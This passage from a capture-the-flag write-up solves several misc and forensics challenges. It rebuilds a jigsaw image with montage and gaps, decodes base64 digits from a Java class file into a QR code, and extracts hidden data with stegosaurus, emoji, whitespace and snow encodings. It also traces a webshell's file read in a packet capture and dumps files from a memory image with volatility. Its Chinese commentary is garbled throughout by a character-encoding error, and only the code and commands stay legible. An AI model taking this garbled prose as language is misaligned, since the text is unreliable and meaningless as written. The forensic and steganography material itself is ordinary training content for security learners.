alt="image-20220118152825786"><br>base32çš„æç¤ºï¼Œç„¶åå°±å¯ä»¥æ„‰å¿«çš„æ‹¼å›¾äº†ã€‚<br>æ‰‹å·¥æ‹¼å›¾å¾ˆç´¯ï¼Œæˆ‘ä»¬è¿™é‡Œä½¿ç”¨å·¥å…·<br><img src="/images/changanzhanyi/7.png" alt="image-20220118154452731"><br><img src="/images/changanzhanyi/8.png" alt="image-20220118154522615"><br>å…ˆçœ‹ä¸‹ä¿¡æ¯ï¼Œæ¯ä¸ªå°å›¾ç‰‡éƒ½æ˜¯100*100çš„æ€»å…±49ä¸ªé¡¹ç›®ï¼Œå»æ‰dsstore è¿˜å‰©48ä¸ªï¼Œå¯èƒ½æ˜¯6x8çš„ï¼Œä¹Ÿå¯èƒ½æ˜¯4x12ï¼Œè¿™é‡Œç”¨4x12çš„ æŠŠæ‰€æœ‰çš„å°å›¾ç‰‡ç”¨<code>montage</code>æ‹¼æˆä¸€ä¸ªå¤§å›¾ç‰‡ï¼Œç„¶åç”¨<code>gaps</code>è¿›è¡Œè¿˜åŸ<br><code>montage *png -tile 12x4 -geometry 100x100+0+0 out.png</code><br>-tileæ˜¯æ‹¼æ¥æ—¶æ¯è¡Œå’Œæ¯åˆ—çš„å›¾ç‰‡æ•°ã€‚è¿™é‡Œç”¨12x4ï¼Œå°±æ˜¯12åˆ—4è¡Œï¼Œä¹Ÿå°±æ˜¯é•¿12å¼ å›¾ç‰‡é«˜4å¼ <br>-geometryæ˜¯æ¯ä¸ªå°å›¾ç‰‡çš„åƒç´ ï¼Œåé¢çš„+0+0æ˜¯è¾¹æ¡†æ˜¯0ï¼Œ<br><img src="/images/changanzhanyi/9.png" alt="image-20220118160159420"><br>æ‹¼æˆä¸€ä¸ªå¤§å›¾ç‰‡åï¼Œç›´æ¥ç”¨gaps,æˆ‘ä»¬ä¸èƒ½ç¡®å®šgenerationsï¼Œå¯ä»¥åŠ ä¸ªversionï¼Œå®ƒå¯ä»¥ä¸€ä¸ªä¸ªæ˜¾ç¤ºï¼Œå¤šè¿è¡Œå‡ éï¼Œä¸­é—´çœ‹é‚£ä¸ªæ¸…æ¥šï¼Œæˆªå›¾å°±å¯ä»¥äº†<br><code>gaps --image=out1.png --generations=100 --population=48 --size=100 --verbose</code><br>â€“image            æŒ‡å‘æ‹¼å›¾çš„è·¯å¾„<br>â€“size            æ‹¼å›¾å—çš„åƒç´ å°ºå¯¸<br>â€“generations    é—ä¼ ç®—æ³•çš„ä»£çš„æ•°é‡<br>â€“population    ä¸ªä½“æ•°é‡<br>â€“verbose        æ¯ä¸€ä»£è®­ç»ƒç»“æŸåå±•ç¤ºæœ€ä½³ç»“æœ<br>â€“save            å°†æ‹¼å›¾è¿˜åŸä¸ºå›¾åƒ<br><img src="/images/changanzhanyi/10.png" alt="image-20220118161022716"></p><h5 id="binary"><a href="#binary" class="headerlink" title="binary"></a>binary</h5><p>ä¸‹è½½é™„ä»¶åï¼Œæ˜¯ä¸€ä¸ªæ–‡ä»¶fileä¸€ä¸‹<br><img src="/images/changanzhanyi/11.png" alt="image-20220118171304054"><br>æ˜¯ä¸€ä¸ªclassæ–‡ä»¶ï¼Œæœæ–­æ”¹æˆ.classåæ‹–åˆ°jd-guié‡Œï¼Œçœ‹èµ·æ¥åƒæ˜¯ascciiï¼Œå¾ˆé•¿ï¼Œè„šæœ¬<br><img src="/images/changanzhanyi/12.png" alt="image-20220118171417093"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">a = <span class="string">&quot;77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 119, 77, 84, 69, 120, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 84, 69, 120, 77, 84, 69, 119, 77, 84, 69, 120, 77, 68, 65, 119, 77, 68, 65, 119, 77, 70, 120, 117, 77, 68, 69, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 65, 120, 77, 68, 69, 120, 77, 84, 69, 120, 77, 68, 65, 119, 77, 84, 69, 120, 77, 68, 69, 120, 77, 68, 69, 120, 77, 84, 69, 120, 77, 70, 120, 117, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 68, 65, 119, 77, 84, 69, 120, 77, 84, 65, 119, 77, 68, 69, 120, 77, 84, 65, 120, 77, 68, 69, 120, 77, 68, 69, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 120, 77, 68, 65, 119, 77, 68, 65, 120, 77, 84, 65, 119, 77, 68, 69, 120, 77, 84, 65, 119, 77, 68, 65, 119, 77, 84, 65, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 120, 77, 84, 65, 120, 77, 84, 65, 120, 77, 84, 65, 119, 77, 84, 69, 119, 77, 84, 69, 119, 77, 84, 65, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 69, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 65, 119, 77, 68, 65, 119, 77, 84, 65, 119, 77, 84, 65, 119, 77, 68, 65, 120, 77, 68, 69, 120, 77, 84, 69, 120, 77, 70, 120, 117, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 65, 119, 77, 68, 65, 119, 77, 70, 120, 117, 77, 84, 69, 120, 77, 84, 69, 120, 77, 84, 69, 119, 77, 68, 69, 119, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 84, 69, 120, 77, 84, 69, 120, 77, 84, 69, 120, 77, 86, 120, 117, 77, 84, 69, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 65, 119, 77, 68, 69, 119, 77, 84, 69, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 84, 65, 119, 77, 70, 120, 117, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 65, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 68, 65, 120, 77, 68, 65, 119, 77, 68, 69, 119, 77, 68, 69, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 84, 69, 119, 77, 86, 120, 117, 77, 84, 65, 120, 77, 84, 65, 119, 77, 68, 65, 119, 77, 84, 65, 119, 77, 84, 69, 120, 77, 84, 65, 119, 77, 84, 69, 119, 77, 68, 65, 120, 77, 84, 65, 120, 77, 68, 65, 119, 77, 68, 65, 120, 77, 68, 65, 120, 77, 70, 120, 117, 77, 84, 69, 120, 77, 68, 69, 120, 77, 84, 69, 120, 77, 84, 69, 120, 77, 68, 65, 120, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 65, 119, 77, 68, 69, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 84, 69, 119, 77, 70, 120, 117, 77, 84, 65, 120, 77, 68, 69, 120, 77, 68, 65, 119, 77, 84, 69, 120, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 120, 77, 68, 69, 119, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 69, 120, 77, 68, 69, 119, 77, 84, 65, 119, 77, 84, 65, 119, 77, 68, 69, 119, 77, 68, 65, 120, 77, 84, 65, 120, 77, 84, 69, 119, 77, 84, 65, 120, 77, 84, 69, 119, 77, 84, 69, 120, 77, 84, 69, 119, 77, 86, 120, 117, 77, 68, 65, 120, 77, 68, 69, 119, 77, 68, 69, 119, 77, 68, 69, 120, 77, 84, 69, 120, 77, 84, 69, 119, 77, 84, 69, 120, 77, 68, 65, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 65, 120, 77, 68, 65, 119, 77, 84, 69, 119, 77, 84, 69, 120, 77, 68, 69, 120, 77, 68, 69, 120, 77, 68, 65, 120, 77, 84, 65, 119, 77, 84, 69, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 84, 69, 119, 77, 86, 120, 117, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 69, 120, 77, 68, 65, 119, 77, 84, 69, 120, 77, 84, 69, 120, 77, 84, 65, 120, 77, 84, 65, 120, 77, 68, 65, 120, 77, 84, 65, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 65, 119, 77, 68, 69, 120, 77, 84, 65, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 84, 69, 119, 77, 68, 65, 119, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 69, 120, 77, 84, 69, 120, 77, 68, 69, 120, 77, 86, 120, 117, 77, 84, 69, 119, 77, 84, 69, 119, 77, 68, 69, 120, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 65, 119, 77, 84, 69, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 68, 69, 120, 77, 68, 65, 119, 77, 68, 69, 119, 77, 70, 120, 117, 77, 68, 69, 119, 77, 84, 65, 119, 77, 84, 65, 119, 77, 84, 69, 120, 77, 84, 65, 119, 77, 84, 65, 119, 77, 68, 65, 119, 77, 84, 65, 119, 77, 84, 69, 120, 77, 68, 65, 120, 77, 68, 65, 120, 77, 68, 69, 120, 77, 86, 120, 117, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 65, 120, 77, 84, 65, 119, 77, 68, 69, 120, 77, 84, 65, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 68, 65, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 84, 65, 119, 77, 70, 120, 117, 77, 84, 65, 119, 77, 84, 69, 119, 77, 84, 69, 120, 77, 84, 69, 119, 77, 84, 69, 120, 77, 68, 69, 120, 77, 68, 65, 120, 77, 68, 65, 120, 77, 84, 69, 120, 77, 84, 69, 119, 77, 84, 65, 120, 77, 84, 69, 119, 77, 86, 120, 117, 77, 84, 69, 119, 77, 84, 69, 119, 77, 68, 65, 120, 77, 68, 69, 120, 77, 84, 65, 119, 77, 68, 65, 119, 77, 68, 69, 119, 77, 84, 69, 120, 77, 68, 69, 120, 77, 68, 65, 119, 77, 84, 65, 120, 77, 84, 65, 120, 77, 70, 120, 117, 77, 68, 65, 120, 77, 84, 65, 119, 77, 84, 65, 119, 77, 68, 69, 120, 77, 84, 69, 119, 77, 84, 69, 119, 77, 68, 65, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 69, 119, 77, 68, 69, 120, 77, 84, 69, 119, 77, 86, 120, 117, 77, 68, 69, 119, 77, 84, 65, 119, 77, 68, 65, 119, 77, 84, 69, 120, 77, 68, 69, 119, 77, 84, 69, 120, 77, 68, 69, 120, 77, 68, 69, 119, 77, 84, 69, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 69, 119, 77, 84, 65, 120, 77, 84, 65, 120, 77, 84, 65, 119, 77, 84, 65, 119, 77, 84, 65, 119, 77, 68, 65, 119, 77, 68, 69, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 65, 120, 77, 84, 69, 120, 77, 86, 120, 117, 77, 68, 69, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 65, 119, 77, 84, 69, 120, 77, 68, 65, 120, 77, 68, 69, 120, 77, 68, 65, 120, 77, 84, 65, 120, 77, 84, 69, 120, 77, 84, 65, 119, 77, 84, 69, 119, 77, 70, 120, 117, 77, 68, 69, 120, 77, 84, 65, 119, 77, 84, 69, 120, 77, 84, 69, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 68, 69, 120, 77, 68, 69, 120, 77, 68, 69, 120, 77, 84, 65, 119, 77, 84, 69, 120, 77, 84, 69, 119, 77, 70, 120, 117, 77, 68, 69, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 68, 69, 120, 77, 68, 65, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 120, 77, 84, 65, 120, 77, 84, 65, 119, 77, 68, 65, 119, 77, 68, 65, 119, 77, 70, 120, 117, 77, 84, 69, 120, 77, 84, 69, 120, 77, 84, 69, 119, 77, 84, 65, 120, 77, 84, 65, 119, 77, 84, 69, 120, 77, 68, 65, 120, 77, 84, 69, 119, 77, 68, 69, 119, 77, 84, 65, 120, 77, 84, 69, 119, 77, 84, 65, 120, 77, 86, 120, 117, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 120, 77, 84, 65, 119, 77, 68, 69, 120, 77, 84, 65, 120, 77, 84, 65, 120, 77, 68, 69, 120, 77, 68, 65, 119, 77, 84, 65, 120, 77, 68, 69, 119, 77, 68, 69, 119, 77, 70, 120, 117, 77, 68, 69, 120, 77, 84, 69, 120, 77, 68, 69, 120, 77, 84, 65, 119, 77, 84, 69, 119, 77, 84, 65, 120, 77, 68, 69, 120, 77, 68, 69, 119, 77, 84, 69, 119, 77, 68, 65, 120, 77, 84, 69, 119, 77, 84, 69, 120, 77, 86, 120, 117, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 68, 69, 120, 77, 68, 65, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 84, 65, 120, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 84, 69, 120, 77, 84, 69, 119, 77, 84, 69, 119, 77, 68, 65, 120, 77, 84, 69, 120, 77, 84, 69, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 69, 120, 77, 86, 120, 117, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 69, 120, 77, 84, 69, 120, 77, 84, 69, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 69, 120, 77, 70, 120, 117, 77, 68, 69, 120, 77, 84, 69, 120, 77, 68, 69, 120, 77, 84, 69, 120, 77, 84, 65, 119, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 65, 119, 77, 84, 69, 120, 77, 84, 65, 119, 77, 68, 69, 120, 77, 68, 69, 120, 77, 70, 120, 117, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 120, 77, 84, 69, 120, 77, 84, 65, 120, 77, 84, 69, 120, 77, 68, 69, 120, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 119, 77, 68, 65, 120, 77, 84, 65, 119, 77, 65, 61, 61&quot;</span></span><br><span class="line">a = a.split(<span class="string">&#x27;, &#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="comment">#print(chr(int(i)),end=&#x27;&#x27;)</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#MDAwMDAwMDEwMTExMDAwMDAwMDAxMTExMTEwMTExMDAwMDAwMFxuMDExMTExMDEwMTEwMTAxMDExMTExMDAwMTExMDExMDExMTExMFxuMDEwMDAxMDEwMDAwMTExMTAwMDExMTAxMDExMDExMDEwMDAxMFxuMDEwMDAxMDExMDAwMDAxMTAwMDExMTAwMDAwMTAxMDEwMDAxMFxuMDEwMDAxMDExMTAxMTAxMTAwMTEwMTEwMTAxMTExMDEwMDAxMFxuMDExMTExMDEwMTExMDEwMDAwMDAwMTAwMTAwMDAxMDExMTExMFxuMDAwMDAwMDEwMTAxMDEwMTAxMDEwMTAxMDEwMTAxMDAwMDAwMFxuMTExMTExMTEwMDEwMDAwMDAwMDEwMDExMDAxMTExMTExMTExMVxuMTEwMDAxMDEwMTAxMDAwMDEwMTExMTExMDEwMDAwMDAxMTAwMFxuMDEwMTEwMTAwMDExMDAxMDAxMDAwMDEwMDExMDEwMTAxMTEwMVxuMTAxMTAwMDAwMTAwMTExMTAwMTEwMDAxMTAxMDAwMDAxMDAxMFxuMTExMDExMTExMTExMDAxMDEwMTEwMTAwMDExMDEwMTAxMTEwMFxuMTAxMDExMDAwMTExMDAwMDAwMDExMDEwMDAwMDAwMDAwMDAxMFxuMDExMDEwMTAwMTAwMDEwMDAxMTAxMTEwMTAxMTEwMTExMTEwMVxuMDAxMDEwMDEwMDExMTExMTEwMTExMDAwMDExMDAxMDEwMDAxMFxuMDAxMDAwMTEwMTExMDExMDExMDAxMTAwMTEwMDExMDAxMTEwMVxuMTExMDEwMDExMDAwMTExMTExMTAxMTAxMDAxMTAwMDAwMDAxMFxuMDAwMDExMTAxMDEwMDAxMTEwMDAwMDEwMTEwMTExMTExMDExMVxuMTEwMTEwMDExMDEwMTEwMTAwMTEwMDAxMDEwMDExMDAwMDEwMFxuMDEwMTAwMTAwMTExMTAwMTAwMDAwMTAwMTExMDAxMDAxMDExMVxuMDEwMTAxMDAxMTAwMDExMTAwMDExMDAxMDAwMDAxMDEwMTAwMFxuMTAwMTEwMTExMTEwMTExMDExMDAxMDAxMTExMTEwMTAxMTEwMVxuMTEwMTEwMDAxMDExMTAwMDAwMDEwMTExMDExMDAwMTAxMTAxMFxuMDAxMTAwMTAwMDExMTEwMTEwMDAxMTExMDEwMDEwMDExMTEwMVxuMDEwMTAwMDAwMTExMDEwMTExMDExMDEwMTExMTExMDEwMDAxMFxuMDEwMTAxMTAxMTAwMTAwMTAwMDAwMDExMDEwMDAxMDAxMTExMVxuMDExMDEwMDAxMDAwMTExMDAxMDExMDAxMTAxMTExMTAwMTEwMFxuMDExMTAwMTExMTEwMDAwMDAxMDExMDExMDExMTAwMTExMTEwMFxuMDEwMDExMDAxMDExMDAxMDEwMDAxMDExMTAxMTAwMDAwMDAwMFxuMTExMTExMTEwMTAxMTAwMTExMDAxMTEwMDEwMTAxMTEwMTAxMVxuMDAwMDAwMDExMTAwMDExMTAxMTAxMDExMDAwMTAxMDEwMDEwMFxuMDExMTExMDExMTAwMTEwMTAxMDExMDEwMTEwMDAxMTEwMTExMVxuMDEwMDAxMDEwMDExMDAwMDExMDAxMTAxMDAwMDAwMDAwMDAxMFxuMDEwMDAxMDEwMTExMTEwMTEwMDAxMTExMTExMTExMDEwMDExMVxuMDEwMDAxMDEwMTEwMTExMTExMTEwMDAwMDAxMDEwMTAxMDExMFxuMDExMTExMDExMTExMTAwMDEwMTEwMTAwMTExMTAwMDExMDExMFxuMDAwMDAwMDExMTExMTAxMTExMDExMDAwMDAwMDEwMDAxMTAwMA==</span></span><br><span class="line"></span><br><span class="line">s = <span class="string">&quot;MDAwMDAwMDEwMTExMDAwMDAwMDAxMTExMTEwMTExMDAwMDAwMFxuMDExMTExMDEwMTEwMTAxMDExMTExMDAwMTExMDExMDExMTExMFxuMDEwMDAxMDEwMDAwMTExMTAwMDExMTAxMDExMDExMDEwMDAxMFxuMDEwMDAxMDExMDAwMDAxMTAwMDExMTAwMDAwMTAxMDEwMDAxMFxuMDEwMDAxMDExMTAxMTAxMTAwMTEwMTEwMTAxMTExMDEwMDAxMFxuMDExMTExMDEwMTExMDEwMDAwMDAwMTAwMTAwMDAxMDExMTExMFxuMDAwMDAwMDEwMTAxMDEwMTAxMDEwMTAxMDEwMTAxMDAwMDAwMFxuMTExMTExMTEwMDEwMDAwMDAwMDEwMDExMDAxMTExMTExMTExMVxuMTEwMDAxMDEwMTAxMDAwMDEwMTExMTExMDEwMDAwMDAxMTAwMFxuMDEwMTEwMTAwMDExMDAxMDAxMDAwMDEwMDExMDEwMTAxMTEwMVxuMTAxMTAwMDAwMTAwMTExMTAwMTEwMDAxMTAxMDAwMDAxMDAxMFxuMTExMDExMTExMTExMDAxMDEwMTEwMTAwMDExMDEwMTAxMTEwMFxuMTAxMDExMDAwMTExMDAwMDAwMDExMDEwMDAwMDAwMDAwMDAxMFxuMDExMDEwMTAwMTAwMDEwMDAxMTAxMTEwMTAxMTEwMTExMTEwMVxuMDAxMDEwMDEwMDExMTExMTEwMTExMDAwMDExMDAxMDEwMDAxMFxuMDAxMDAwMTEwMTExMDExMDExMDAxMTAwMTEwMDExMDAxMTEwMVxuMTExMDEwMDExMDAwMTExMTExMTAxMTAxMDAxMTAwMDAwMDAxMFxuMDAwMDExMTAxMDEwMDAxMTEwMDAwMDEwMTEwMTExMTExMDExMVxuMTEwMTEwMDExMDEwMTEwMTAwMTEwMDAxMDEwMDExMDAwMDEwMFxuMDEwMTAwMTAwMTExMTAwMTAwMDAwMTAwMTExMDAxMDAxMDExMVxuMDEwMTAxMDAxMTAwMDExMTAwMDExMDAxMDAwMDAxMDEwMTAwMFxuMTAwMTEwMTExMTEwMTExMDExMDAxMDAxMTExMTEwMTAxMTEwMVxuMTEwMTEwMDAxMDExMTAwMDAwMDEwMTExMDExMDAwMTAxMTAxMFxuMDAxMTAwMTAwMDExMTEwMTEwMDAxMTExMDEwMDEwMDExMTEwMVxuMDEwMTAwMDAwMTExMDEwMTExMDExMDEwMTExMTExMDEwMDAxMFxuMDEwMTAxMTAxMTAwMTAwMTAwMDAwMDExMDEwMDAxMDAxMTExMVxuMDExMDEwMDAxMDAwMTExMDAxMDExMDAxMTAxMTExMTAwMTEwMFxuMDExMTAwMTExMTEwMDAwMDAxMDExMDExMDExMTAwMTExMTEwMFxuMDEwMDExMDAxMDExMDAxMDEwMDAxMDExMTAxMTAwMDAwMDAwMFxuMTExMTExMTEwMTAxMTAwMTExMDAxMTEwMDEwMTAxMTEwMTAxMVxuMDAwMDAwMDExMTAwMDExMTAxMTAxMDExMDAwMTAxMDEwMDEwMFxuMDExMTExMDExMTAwMTEwMTAxMDExMDEwMTEwMDAxMTEwMTExMVxuMDEwMDAxMDEwMDExMDAwMDExMDAxMTAxMDAwMDAwMDAwMDAxMFxuMDEwMDAxMDEwMTExMTEwMTEwMDAxMTExMTExMTExMDEwMDExMVxuMDEwMDAxMDEwMTEwMTExMTExMTEwMDAwMDAxMDEwMTAxMDExMFxuMDExMTExMDExMTExMTAwMDEwMTEwMTAwMTExMTAwMDExMDExMFxuMDAwMDAwMDExMTExMTAxMTExMDExMDAwMDAwMDEwMDAxMTAwMA==&quot;</span></span><br><span class="line">s = base64.b64decode(s)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line"><span class="comment">#</span></span><br></pre></td></tr></table></figure><p>0101çš„ç»„åˆï¼Œé•¿å’Œå®½éƒ½æ˜¯37ä½ï¼Œæœæ–­çŒœä¸€ä¸‹è½¬äºŒç»´ç ï¼Œè„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">x = <span class="number">37</span>   <span class="comment">#æ³¨æ„è¿™é‡Œä¸€å®šè¦çœ‹ä¸€ä¸‹é«˜åº¦å’Œå®½åº¦</span></span><br><span class="line">y = <span class="number">37</span></span><br><span class="line">im = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (x, y))</span><br><span class="line">white = (<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>)</span><br><span class="line">black = (<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;D:\\vscodework\\python\\misc\\key.txt&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(x):</span><br><span class="line">        ff = f.readline()</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(y):</span><br><span class="line">            <span class="keyword">if</span> ff[j] == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">                im.putpixel((i, j), black)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                im.putpixel((i, j), white)</span><br><span class="line">im.save(<span class="string">&quot;D:\\vscodework\\python\\misc\\1.jpg&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="/images/changanzhanyi/13.png" alt="image-20220118172445205"></p><h5 id="Ez-Steg"><a href="#Ez-Steg" class="headerlink" title="Ez_Steg"></a>Ez_Steg</h5><p>ä¸‹è½½é™„ä»¶ï¼Œè§£å‹ä¸€ä¸‹æœ‰å¯†ç ï¼Œæœ‰æ³¨é‡Šï¼Œå…­ä¸ªæ•°å­—<br><img src="/images/changanzhanyi/14.png" alt="image-20220118202827001"><br>çˆ†ç ´ä¸€ä¸‹å¯†ç 220101<br><img src="/images/changanzhanyi/15.png" alt="image-20220118202926688"><br>ä¸¤ä¸ªæ–‡ä»¶ï¼Œä¸€ä¸ªemjioè¡¨æƒ…ï¼Œç†è®ºä¸Šæ¥è¯´æ˜¯emjioåŠ å¯†ï¼Œä¸€ä¸ªpycæ–‡ä»¶ï¼Œåç¼–è¯‘å‡ºæ¥  æ²¡å•¥ç”¨ï¼Œå°±ä¸ä¼šäº†<br>åæ¥çœ‹å¤§å¸ˆå‚…çš„wpï¼Œæ˜¯å‰‘é¾™åŠ å¯†ï¼Œ<code>https://github.com/AngelKitty/stegosaurus</code><br><img src="/images/changanzhanyi/16.png" alt="image-20220118204451068">æ¥ä¸€ä¸‹æœ‰ä¸ªkey<br>æ‹¿å»emjioè§£å¯†<code>https://aghorler.github.io/emoji-ae</code><br><img src="/images/changanzhanyi/17.png" alt="image-20220118204700866"><br><img src="/images/changanzhanyi/18.png" alt="image-20220118204716886"></p><h5 id="æ— å­—å¤©ä¹¦"><a href="#æ— å­—å¤©ä¹¦" class="headerlink" title="æ— å­—å¤©ä¹¦"></a>æ— å­—å¤©ä¹¦</h5><p>æ‹¿åˆ°é™„ä»¶è§£å‹ä¸€ä¸‹ï¼Œè¿‡æ»¤httpå’Œ1.php 1.phpæ˜¯ä¸ªå†°èçš„é©¬å­<br>æœ‰ä¸€ä¸ªè¯»å–æ–‡ä»¶çš„æ“ä½œï¼Œè¿½è¸ªhttpæµï¼Œä¸‹é¢<code>504b0304</code>æ˜¯zip16è¿›åˆ¶å¤´<br><img src="/images/changanzhanyi/19.png" alt="image-20220119144025872"><br><img src="/images/changanzhanyi/20.png" alt="image-20220119144107117"><br>å¤åˆ¶å‡ºæ¥ç”¨winhexåšä¸€ä¸ªï¼Œè§£å‹æ˜¯ä¸¤ä¸ªæ–‡ä»¶<code>.ws</code>æ–‡ä»¶æ˜¯whitespaceåŠ å¯†ï¼Œè§£å¯†ä¸€ä¸‹ï¼Œæ˜¯å¯†ç ï¼Œåœ¨çº¿ç½‘å€<code>http://vii5ard.github.io/whitespace/</code><br><img src="/images/changanzhanyi/21.png" alt="image-20220119150500514"><br><img src="/images/changanzhanyi/22.png" alt="image-20220119144904711"><br><code>XiAnWillBeSafe</code><br>ç„¶åæ˜¯snowåŠ å¯†ï¼Œé¡¹ç›®åœ°å€åœ¨ä¸‹é¢ï¼Œè§£å¯†ä¸€ä¸‹å°±å‡ºäº†<br><img src="/images/changanzhanyi/23.png" alt="image-20220119150041048"><br><code>http://www.darkside.com.au/snow/</code></p><h5 id="æœ´å®æ— åçš„å–è¯"><a href="#æœ´å®æ— åçš„å–è¯" class="headerlink" title="æœ´å®æ— åçš„å–è¯"></a>æœ´å®æ— åçš„å–è¯</h5><p>æ‹¿åˆ°æ–‡ä»¶å…ˆçœ‹ä¸€ä¸‹é•œåƒç³»ç»Ÿä¿¡æ¯<br><code>python2 vol.py -f xp_sp3.raw imageinfo</code><br><img src="/images/changanzhanyi/24.png" alt="image-20220120160029257"><br>æ˜¯winxpsp2x86,çœ‹ä¸‹fileï¼Œä¸€èˆ¬filescanç»™å‡ºçš„ä¿¡æ¯å¤ªå¤šäº†ï¼Œé¢˜ç›®å¦‚æœç»™æç¤ºçš„è¯ï¼Œä¸€èˆ¬grepä¸‹æç¤ºï¼Œä¸ç»™çš„è¯grepflag<br><code>python2 vol.py -f xp_sp3.raw --profile=WinXPSP3x86 filescan | grep &#39;flag&#39;</code><br><img src="/images/changanzhanyi/25.png" alt="image-20220120160645562"><br>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æ¡Œé¢ä¸Šæœ‰flag.zipå’Œflag.pngï¼Œç»Ÿç»Ÿæå–å‡ºæ¥çœ‹ä¸‹</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python2 vol.py -f xp_sp3.raw --profile=WinXPSP3x86 dumpfiles -Q 0x0000000001b34f90 -D ./cab -u</span><br><span class="line">python2 vol.py -f xp_sp3.raw --profile=WinXPSP3x86 dumpfiles -Q 0x0000000001e65028 -D ./cab 